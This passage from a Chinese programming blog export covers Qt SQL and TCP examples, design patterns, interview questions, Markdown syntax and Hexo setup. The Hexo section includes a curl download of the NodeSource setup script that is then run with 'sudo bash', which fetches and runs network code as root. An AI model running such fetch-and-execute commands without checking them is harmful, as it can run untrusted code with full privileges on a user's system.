title="创建目录"></a>创建目录</h3><p>创建目录使用<code>QDir</code>接口，有两个函数<code>mkdir</code>和<code>mkpath</code>。区别如下：</p><ul><li>mkdir：上层目录不存在时，创建会失败。目录已经存在时会返回false。</li><li>mkpath：上层目录不存在也没关系，自动一起创建。目录已经存在时会返回true。</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QDir().<span class="built_in">mkdir</span>(path);</span><br><span class="line">QDir().mkpath(path);</span><br></pre></td></tr></table></figure><h2 id="数据库接口"><a href="#数据库接口" class="headerlink" title="数据库接口"></a>数据库接口</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Qt中的Qt SQL模块提供了对数据库的支持，该模块中的众多类基本上可以分为三层，如下图所示。</p><img src="/2018/10/15/2018-10-15-qtStudy/2018_10_15_01.jpg"><ul><li>驱动层为具体的数据库和SQL接口层之间提供了底层的桥梁；</li><li>SQL接口层提供了对数据库的访问，其中的QSqlDatabase类用来创建连接，QSqlQuery类可以使用SQL语句来实现与数据库交互，其他几个类对该层提供了支持；</li><li>用户接口层的几个类实现了将数据库中的数据链接到窗口部件上，它们是更高层次的抽象，即便不熟悉SQL也可以操作数据库。</li></ul><p>如果要使用Qt SQL模块中的这些类，需要在项目文件（.pro文件）中添加<code>QT += sql</code>这一行代码。对应数据库部分的内容，大家可以在帮助中查看SQL Programming关键字。</p><h3 id="列出可用数据库驱动"><a href="#列出可用数据库驱动" class="headerlink" title="列出可用数据库驱动"></a>列出可用数据库驱动</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QCoreApplication&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QSqlDatabase&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QDebug&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QStringList&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">QCoreApplication <span class="title">a</span><span class="params">(argc, argv)</span></span>;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"Available drivers:"</span>;</span><br><span class="line">    QStringList drivers = QSqlDatabase::drivers();</span><br><span class="line">    foreach(QString driver, drivers)</span><br><span class="line">        qDebug() &lt;&lt; driver;</span><br><span class="line">    <span class="keyword">return</span> a.exec();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="简单数据库应用"><a href="#简单数据库应用" class="headerlink" title="简单数据库应用"></a>简单数据库应用</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QCoreApplication&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QSqlDatabase&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QDebug&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QSqlQuery&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="function">QCoreApplication <span class="title">a</span><span class="params">(argc, argv)</span></span>;</span><br><span class="line">    <span class="comment">//创建一个SQLite数据库连接</span></span><br><span class="line">    QSqlDatabase db = QSqlDatabase::addDatabase(<span class="string">"QSQLITE"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//数据库连接命名</span></span><br><span class="line">    db.setDatabaseName(<span class="string">":memory:"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打开数据库</span></span><br><span class="line">    <span class="keyword">if</span>(!db.<span class="built_in">open</span>())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//以下执行相关sql语句</span></span><br><span class="line">    <span class="function">QSqlQuery <span class="title">query</span><span class="params">(db)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//新建student表，id设置为主键，还有一个name项</span></span><br><span class="line">    query.exec(<span class="string">"create table student(id int primary key,name varchar)"</span>);</span><br><span class="line">    <span class="comment">//向表中插入3条记录</span></span><br><span class="line">    query.exec(<span class="string">"insert into student values(1,'xiaogang')"</span>);</span><br><span class="line">    query.exec(<span class="string">"insert into student values(2,'xiaoming')"</span>);</span><br><span class="line">    query.exec(<span class="string">"insert into student values(3,'xiaohong')"</span>);</span><br><span class="line">    <span class="comment">//查找表中id &gt;=2 的记录的id项和name项的值</span></span><br><span class="line">    query.exec(<span class="string">"select id,name from student where id &gt;= 2"</span>);</span><br><span class="line">    <span class="comment">//query.next()指向查找到的第一条记录，然后每次后移一条记录</span></span><br><span class="line">    <span class="keyword">while</span>(query.next()) &#123;</span><br><span class="line">        <span class="comment">//query.value(0)是id的值，将其转换为int型</span></span><br><span class="line">        <span class="keyword">int</span> value0 = query.value(<span class="number">0</span>).toInt();</span><br><span class="line">        QString value1 = query.value(<span class="number">1</span>).toString();</span><br><span class="line">        <span class="comment">//输出两个值</span></span><br><span class="line">        qDebug() &lt;&lt; value0 &lt;&lt; value1 ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a.exec();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="QSqlQuery"><a href="#QSqlQuery" class="headerlink" title="QSqlQuery"></a>QSqlQuery</h3><h4 id="初始化连接数据库"><a href="#初始化连接数据库" class="headerlink" title="初始化连接数据库"></a>初始化连接数据库</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建一个SQLite数据库连接</span></span><br><span class="line">QSqlDatabase db = QSqlDatabase::addDatabase(<span class="string">"QSQLITE"</span>);</span><br><span class="line"><span class="comment">//数据库连接命名</span></span><br><span class="line">db.setDatabaseName(<span class="string">"wangyubo.db"</span>);</span><br><span class="line"><span class="comment">//打开数据库</span></span><br><span class="line"><span class="keyword">if</span>(!db.<span class="built_in">open</span>()) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">QSqlQuery <span class="title">sqlQuery</span><span class="params">(db)</span></span>;</span><br></pre></td></tr></table></figure><h4 id="执行一条语句并打印错误信息"><a href="#执行一条语句并打印错误信息" class="headerlink" title="执行一条语句并打印错误信息"></a>执行一条语句并打印错误信息</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">QSqlQuery <span class="title">sqlQuery</span><span class="params">(db)</span></span>;</span><br><span class="line"><span class="keyword">bool</span> result = sqlQuery.exec(<span class="string">"CREATE TABLE IF NOT EXISTS Account ("</span></span><br><span class="line">                            <span class="string">"id TEXT PRIMARY KEY UNIQUE, "</span></span><br><span class="line">                            <span class="string">"username TEXT, "</span></span><br><span class="line">                            <span class="string">"password TEXT, "</span></span><br><span class="line">                            <span class="string">"nickname TEXT, "</span></span><br><span class="line">                            <span class="string">"lastLoginTime INTEGER, "</span></span><br><span class="line">                            <span class="string">"createTime INTEGER, "</span></span><br><span class="line">                            <span class="string">"configs TEXT)"</span>);</span><br><span class="line"><span class="keyword">if</span> (!result) &#123;</span><br><span class="line">    LOG_ERROR(<span class="string">"Create table Account failed, code %d, %s"</span>, sqlQuery.lastError().type(), sqlQuery.lastError().<span class="built_in">text</span>().toLatin1().data());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">LOG_INFO(<span class="string">"Create table Account success"</span>);</span><br></pre></td></tr></table></figure><h4 id="获取查询的结果"><a href="#获取查询的结果" class="headerlink" title="获取查询的结果"></a>获取查询的结果</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">QSqlQuery <span class="title">sqlQuery</span><span class="params">(db)</span></span>;</span><br><span class="line"><span class="keyword">bool</span> result = sqlQuery.exec(<span class="string">"SELECT * FROM TM_Account"</span>);</span><br><span class="line"><span class="keyword">if</span> (!result) &#123;</span><br><span class="line">    LOG_ERROR(<span class="string">"Query failed, code %d, %s"</span>, sqlQuery.lastError().type(), sqlQuery.lastError().<span class="built_in">text</span>().toLatin1().data());</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果有几个条目（列数）</span></span><br><span class="line"><span class="keyword">int</span> itemSize = sqlQuery.record().count();</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历结果</span></span><br><span class="line"><span class="keyword">while</span> (sqlQuery.next()) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; itemSize; ++i) &#123;</span><br><span class="line">        <span class="comment">//int</span></span><br><span class="line">        <span class="keyword">int</span> resultInt = sqlQuery.value(i).toInt();</span><br><span class="line">        <span class="comment">//QString</span></span><br><span class="line">        QString resultStr = sqlQuery.value(i).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//特定结果</span></span><br><span class="line">QString resultStr = sqlQuery.value(<span class="string">"username"</span>).toString();</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果所在的条目序号，从0开始</span></span><br><span class="line"><span class="keyword">int</span> index = sqlQuery.at();</span><br><span class="line"></span><br><span class="line"><span class="comment">//转到第一条记录</span></span><br><span class="line">sqlQuery.first();</span><br><span class="line"></span><br><span class="line"><span class="comment">//转到最后一条记录</span></span><br><span class="line">sqlQuery.last();</span><br><span class="line"></span><br><span class="line"><span class="comment">//转到下一条记录</span></span><br><span class="line">sqlQuery.next();</span><br><span class="line"></span><br><span class="line"><span class="comment">//总条数（行数）</span></span><br><span class="line">sqlQuery.last();</span><br><span class="line"><span class="keyword">int</span> count = sqlQuery.at() + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h2 id="网络相关接口"><a href="#网络相关接口" class="headerlink" title="网络相关接口"></a>网络相关接口</h2><h3 id="TCP客户端-服务器"><a href="#TCP客户端-服务器" class="headerlink" title="TCP客户端/服务器"></a>TCP客户端/服务器</h3><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>需要在工程文件<code>.pro</code>中添加<code>QT += network</code>才能看到<code>QTcpSocket</code>头文件</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QTcpSocket&gt;</span></span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainWindow</span> :</span> <span class="keyword">public</span> QMainWindow</span><br><span class="line">&#123;</span><br><span class="line">    Q_OBJECT</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">MainWindow</span><span class="params">(QWidget *parent = <span class="number">0</span>)</span></span>;</span><br><span class="line">    ~MainWindow();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> slots:</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">tcpClientDisconnected</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">tcpClientReceiveData</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * @description 初始化TcpSocket</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">initTcpSocket</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * @description tcp客户端连接</span></span><br><span class="line"><span class="comment">     * @return 0，成功；其他，错误码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">tcpClientConnect</span><span class="params">()</span></span>;</span><br><span class="line">    ......</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;QTcpSocket&gt; m_pTcpSocket = <span class="literal">nullptr</span>;         <span class="comment">//tcp客户端连接指针</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//cpp</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="comment">//收到数据的处理函数</span></span><br><span class="line"><span class="keyword">void</span> MainWindows::tcpClientReceiveData() &#123;</span><br><span class="line">    QByteArray <span class="built_in">buffer</span> = m_pTcpSocket-&gt;readAll();</span><br><span class="line">    LOG_HEX(<span class="built_in">buffer</span>.data(), <span class="built_in">buffer</span>.<span class="built_in">size</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//tcp断开连接的处理函数</span></span><br><span class="line"><span class="keyword">void</span> MainWindows::tcpClientDisconnected() &#123;</span><br><span class="line">    LOG_INFO(<span class="string">"TcpClient disconnected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化tcp连接</span></span><br><span class="line"><span class="keyword">void</span> MainWindows::initTcpSocket() &#123;</span><br><span class="line">    <span class="comment">//实例化tcpSocket</span></span><br><span class="line">    m_pTcpSocket = <span class="built_in">std</span>::make_shared&lt;QTcpSocket&gt;();</span><br><span class="line">    <span class="comment">//连接信号量</span></span><br><span class="line">    <span class="comment">//断开连接信号</span></span><br><span class="line">    QObject::<span class="built_in">connect</span>(m_pTcpSocket.<span class="built_in">get</span>(), SIGNAL(disconnected()), <span class="keyword">this</span>, SLOT(tcpClientDisconnected()));</span><br><span class="line">    <span class="comment">//收到数据信号</span></span><br><span class="line">    QObject::<span class="built_in">connect</span>(m_pTcpSocket.<span class="built_in">get</span>(), SIGNAL(readyRead()), <span class="keyword">this</span>, SLOT(tcpClientReceiveData()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//连接tcp</span></span><br><span class="line"><span class="keyword">void</span> MainWindows::tcpClientConnect() &#123;</span><br><span class="line">    QString host = <span class="string">"Githubwyb.github.io"</span>;</span><br><span class="line">    <span class="keyword">int</span> port = <span class="number">8080</span>;</span><br><span class="line">    LOG_INFO(<span class="string">"Connect to %s:%d"</span>, host.toLatin1().data(), port);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//断开以前的连接</span></span><br><span class="line">    m_pTcpSocket-&gt;<span class="built_in">abort</span>();</span><br><span class="line">    <span class="comment">//连接服务器</span></span><br><span class="line">    m_pTcpSocket-&gt;connectToHost(host, port);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//等待五秒连接</span></span><br><span class="line">    <span class="keyword">if</span> (!m_pTcpSocket-&gt;waitForConnected(<span class="number">5000</span>)) &#123;</span><br><span class="line">        LOG_ERROR(<span class="string">"Connect error"</span>);</span><br><span class="line">        QMessageBox::critical(<span class="keyword">this</span>, <span class="string">"Connect error"</span>, QString(<span class="string">"Can't connect to %1:%2"</span>).arg(host).arg(port));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    LOG_INFO(<span class="string">"Connect success"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><h1 id="widgets-application"><a href="#widgets-application" class="headerlink" title="widgets application"></a>widgets application</h1><h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>尝试着把自己写的工程程序给打包发布出来，在任何一台windows系统都能运行，这样就不会限于电脑需不需要安装QT安装包了。<br>使用QT5自带的windeployqt</p><ol><li>打开一个QT程序，以release方式运行一次。</li><li>这时你的工程项目文件夹下，会生成一个关于release的文件夹。</li><li>打开关于release相关的文件夹，找到该目录下release目录下的.exe程序。此时你点击是运行不成功的。因为缺少QT必要的库文件。将这个.exe文件拷贝出来，创建一个单独的文件夹，放在这个文件夹下。</li><li>打开命令行，定位到上一步的文件夹中，使用qt安装目录的windeployqt+程序名进行打包。我的执行命令如下：<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">ProgramData</span>\<span class="title">Qt</span>\<span class="title">Qt5</span>.10.1\5.10.1\<span class="title">mingw53_32</span>\<span class="title">bin</span>\<span class="title">windeployqt.exe</span> .\<span class="title">test.exe</span></span></span><br></pre></td></tr></table></figure></li><li>打开程序，根据弹出的缺少的dll，从bin目录下拷贝过去即可。</li></ol><h1 id="踩坑记"><a href="#踩坑记" class="headerlink" title="踩坑记"></a>踩坑记</h1><h2 id="debug成功，release闪退"><a href="#debug成功，release闪退" class="headerlink" title="debug成功，release闪退"></a>debug成功，release闪退</h2><ol><li>一个原因是因为debug版本和release版本切换后需要清理一下工程，重新编译才行</li></ol>]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>面试可以问的问题</title>
    <url>/2018/10/10/2018-10-10-interviewQuestion/</url>
    <content><![CDATA[<h1 id="性格"><a href="#性格" class="headerlink" title="性格"></a>性格</h1><ol><li>介绍一下自己</li><li>被刷了怎么办</li><li>以后的打算</li></ol><h1 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h1><ol><li>如何学习一门新的语言<ul><li>记笔记</li><li>做实践</li></ul></li><li>做过什么项目，担任什么工作，怎么做<ul><li>对于项目的架构的了解</li><li>是不是水</li></ul></li><li>遇到技术问题怎么办</li></ol><h1 id="利益相关"><a href="#利益相关" class="headerlink" title="利益相关"></a>利益相关</h1><ol><li>时间冲突怎么做</li></ol>]]></content>
      <categories>
        <category>Work</category>
      </categories>
  </entry>
  <entry>
    <title>面向对象学习笔记</title>
    <url>/2018/10/09/2018-10-09-objectOrientedStudy/</url>
    <content><![CDATA[<h1 id="面向对象基本概念"><a href="#面向对象基本概念" class="headerlink" title="面向对象基本概念"></a>面向对象基本概念</h1><ol><li>三大特性：封装-继承-多态</li><li>一些相关的重要概念：抽象-组合-动态绑定-消息传递</li></ol><h1 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h1><p>由面向对象基本特性得来的设计模式包括三类23种，如下所示：</p><h2 id="设计原则"><a href="#设计原则" class="headerlink" title="设计原则"></a>设计原则</h2><ol><li>OCP-开放封闭原则：开放扩展，封装更改</li><li>LSP-里氏代换原则：子类必须能够替换其父类</li><li>DIP-依赖倒转原则：抽象不应依赖细节，细节应依赖抽象（面向接口）</li><li>ISP-接口隔离原则：一个类对另外一个类的依赖应当建立在最小的接口上</li><li>CARP-合成/聚合复用原则：尽量使用合成/聚合，尽量不要使用继承（因继承是强偶合）</li><li>LoD-迪米特法则：若两个类不必直接通信，则不应直接交互。成员该私有要私有</li><li>SRP-单一职责原则：就一个类而言，应该仅有一个引起它变化的原因</li></ol><h2 id="A．创建型模式"><a href="#A．创建型模式" class="headerlink" title="A．创建型模式"></a>A．创建型模式</h2><ol><li>工厂方法模式（虚拟构造子模式/多态性工厂模式）：定义一个创建实例对象的工厂接口，将实际创建工作推迟到子类中。</li><li>抽象工厂模式：最为抽象最具一般性，向客户端提供一个接口，使客户端在不必指定实例的具体类型的情况下创建多个实例族的实例对象。</li><li>单例模式：只能得到一个对象实例，构造方法私有。</li><li>建造者模式：将复杂对象的构建与其表示分开，使同样的构建过程可以创建不同的表示。</li><li>原型模式：用原型实例指定创建对象的种类，并且通过拷贝这些原型创建新的对象</li></ol><h2 id="B．结构型模式"><a href="#B．结构型模式" class="headerlink" title="B．结构型模式"></a>B．结构型模式</h2><ol start="6"><li>适配器模式：为接口提供缺省实现以供扩展。使得子类只需覆盖这个缺省实现的个别方法，而无须去实现中的每个方法。JDK1.8中了提供了为接口添加默认实现的新特性</li><li>组合（部分-整体）模式：将对象组合成树形结构以表示“部分-整体”的层次结构</li><li>装饰器模式：动态给对象添加额外职责，比通过生成子类来增加功能更加灵活</li><li>代理模式：提供代理以控制对原对象的访问。关键：代理与原对象共用一 个接口</li><li>享元模式：运用共享技术有效地支持大量的细粒度对象</li><li>外观（门面）模式：为一组接口提供一个一致的接口，体现了DIP和LoD原则</li><li>桥接模式：将抽象部分与其实现部分分离，使它们都可以独立变化，可实现多角度分类</li></ol><h2 id="C．行为型模式"><a href="#C．行为型模式" class="headerlink" title="C．行为型模式"></a>C．行为型模式</h2><ol start="13"><li>策略模式：定义一系列形式相同实现不同的算法，减少耦合，封装变化</li><li>模板方法模式：定义一个操作中算法的骨架，而将一些具体步骤延迟到子类</li><li>观察者模式(发布-订阅模式)：定义一种一对多的依赖关系，让多个观察者对象同时监听某一个通知者对象</li><li>迭代器模式：提供顺序访问一个聚合中元素的方法。不常用，因为语言本身已内置</li><li>职责链模式：使多个对象都有机会获得机会处理请求。这些对象连成一条链。减少请求得与接收者的耦合。如过滤器</li><li>命令模式：将请求封装成一个对象，以使你可用不同的请求对客户端进行参数化；可对请求进行排除、记录日志、或撤销操作</li><li>备忘录模式：在不破坏封装的前提下捕获一个对象的内部状态，并在该对象外部保存此状态</li><li>状态模式：当一个状态改变时，允许改变其行为，看其来像是改变了其类。（将复杂的条件判断转移到多个小类中）</li><li>访问者模式：表示一个作用于某对象结构中的各元素的操作。把数据处理与数据结构分开</li><li>解释器模式：对一个语言定义一个文法的表示，并定义一个解释器，来解释语言中的句子，如正则表达式，浏览器。通过解释执行</li><li>中介者(调停者)模式：用一个中介对象来封装一系列的对象交互。应用于星形结构的对象关系中</li></ol>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Study</category>
      </categories>
  </entry>
  <entry>
    <title>markdown学习笔记</title>
    <url>/2018/10/08/2018-10-08-markdownStudy/</url>
    <content><![CDATA[<h1 id="写文档"><a href="#写文档" class="headerlink" title="写文档"></a>写文档</h1><h2 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&amp;nbsp;</span><br></pre></td></tr></table></figure><h2 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">~~删除线~~</span><br></pre></td></tr></table></figure><p>效果</p><p><del>删除线</del></p><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><h3 id="链接写在文中"><a href="#链接写在文中" class="headerlink" title="链接写在文中"></a>链接写在文中</h3><p>代码</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">[<span class="string">我的博客</span>](<span class="link">https://githubwyb.github.io/</span>)</span><br></pre></td></tr></table></figure><p>效果</p><p><a href="https://githubwyb.github.io/" target="_blank" rel="noopener">我的博客</a></p><h3 id="链接写在文后"><a href="#链接写在文后" class="headerlink" title="链接写在文后"></a>链接写在文后</h3><p>代码</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">[<span class="string">我的博客</span>][<span class="symbol">1</span>]</span><br><span class="line"></span><br><span class="line">[<span class="symbol">1</span>]: <span class="link">https://githubwyb.github.io/</span></span><br></pre></td></tr></table></figure><p>效果</p><p><a href="https://githubwyb.github.io/" target="_blank" rel="noopener">我的博客</a></p><h2 id="文内跳转"><a href="#文内跳转" class="headerlink" title="文内跳转"></a>文内跳转</h2><p>代码</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span> = <span class="string">"test"</span>&gt;</span></span>跳转到这里<span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">[<span class="string">跳转</span>](<span class="link">#test</span>)</span><br></pre></td></tr></table></figure><p>效果</p><p><span id="test">跳转到这里</span></p><p><a href="#test">跳转</a></p>]]></content>
      <categories>
        <category>Program</category>
        <category>Document</category>
      </categories>
  </entry>
  <entry>
    <title>hexo搭建中的学习笔记</title>
    <url>/2018/09/28/2018-09-28-hexoStudy/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h2><h3 id="安装nodejs和npm"><a href="#安装nodejs和npm" class="headerlink" title="安装nodejs和npm"></a>安装nodejs和npm</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -sL https://deb.nodesource.com/setup_8.x -o nodesource_setup.sh</span><br><span class="line">sudo bash nodesource_setup.sh</span><br><span class="line">sudo apt-get install nodejs</span><br></pre></td></tr></table></figure><h3 id="安装hexo和hexo-cli"><a href="#安装hexo和hexo-cli" class="headerlink" title="安装hexo和hexo-cli"></a>安装hexo和hexo-cli</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo npm install hexo -g</span><br><span class="line">sudo npm install hexo-cli -g</span><br></pre></td></tr></table></figure><h3 id="迁移博客代码到另一台电脑"><a href="#迁移博客代码到另一台电脑" class="headerlink" title="迁移博客代码到另一台电脑"></a>迁移博客代码到另一台电脑</h3><ul><li>先安装<code>hexo</code>和<code>hexo-cli</code>的环境</li><li>然后执行</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo npm install</span><br><span class="line">sudo npm audit fix</span><br></pre></td></tr></table></figure><h1 id="插件和操作"><a href="#插件和操作" class="headerlink" title="插件和操作"></a>插件和操作</h1><h2 id="博客置顶"><a href="#博客置顶" class="headerlink" title="博客置顶"></a>博客置顶</h2><h3 id="单纯置顶"><a href="#单纯置顶" class="headerlink" title="单纯置顶"></a>单纯置顶</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm uninstall hexo-generator-index --save</span><br><span class="line">npm install hexo-generator-index-pin-top --save</span><br></pre></td></tr></table></figure><ul><li>然后在需要置顶的文章的Front-matter中加上top属性即可，根据top属性的大小排序，越大越靠前。比如下面这篇文章：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: hexo+GitHub博客搭建实战</span><br><span class="line">date: 2017-09-08 12:00:25</span><br><span class="line">categories: 博客搭建系列</span><br><span class="line">top: 5</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h2 id="pdf插件"><a href="#pdf插件" class="headerlink" title="pdf插件"></a>pdf插件</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><ul><li>在博客bash中执行下列命令安装</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-pdf</span><br></pre></td></tr></table></figure><h3 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h3><ul><li>使用外部文章网页链接</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;% pdf http:<span class="comment">//7xov2f.com1.z0.glb.clouddn.com/bash_freshman.pdf %&#125;</span></span><br></pre></td></tr></table></figure><ul><li>本地</li></ul><p>需要创建一个同名的文件夹，放我们要上传的PDF文章</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;% pdf  test.pdf %&#125;</span><br></pre></td></tr></table></figure><h2 id="字数统计和阅读时长-网站底部-文章内"><a href="#字数统计和阅读时长-网站底部-文章内" class="headerlink" title="字数统计和阅读时长(网站底部/文章内)"></a>字数统计和阅读时长(网站底部/文章内)</h2><h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-symbols-count-time --save</span><br></pre></td></tr></table></figure><h3 id="修改-站点配置文件"><a href="#修改-站点配置文件" class="headerlink" title="修改 站点配置文件"></a>修改 站点配置文件</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line"> <span class="comment">#文章内是否显示</span></span><br><span class="line"> <span class="attr">symbols:</span> <span class="literal">true</span></span><br><span class="line"> <span class="attr">time:</span> <span class="literal">true</span></span><br><span class="line"> <span class="comment"># 网页底部是否显示</span></span><br><span class="line"> <span class="attr">total_symbols:</span> <span class="literal">true</span></span><br><span class="line"> <span class="attr">total_time:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="修改-主题配置文件"><a href="#修改-主题配置文件" class="headerlink" title="修改 主题配置文件"></a>修改 主题配置文件</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Post wordcount display settings</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/hexo-symbols-count-time</span></span><br><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line"> <span class="attr">separated_meta:</span> <span class="literal">true</span></span><br><span class="line"> <span class="comment">#文章中的显示是否显示文字（本文字数|阅读时长）</span></span><br><span class="line"> <span class="attr">item_text_post:</span> <span class="literal">true</span></span><br><span class="line"> <span class="comment">#网页底部的显示是否显示文字（站点总字数|站点阅读时长）</span></span><br><span class="line"> <span class="attr">item_text_total:</span> <span class="literal">false</span></span><br><span class="line"> <span 